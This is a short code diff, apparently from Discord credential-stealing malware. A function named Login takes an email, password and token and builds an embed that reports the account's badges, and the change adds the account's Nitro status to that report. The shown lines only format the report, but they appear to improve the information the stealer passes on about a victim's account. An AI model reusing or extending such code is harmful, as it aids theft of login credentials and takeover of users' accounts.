@@ -199,7 +199,7 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "**Badges**",
-                            "value": `${GetBadges(json.flags)}`,
+                            "value": `${GetBadges(json.flags)} ${GetNitro(json.premium_type)}`,
                             "inline": true
                         }
                     ],
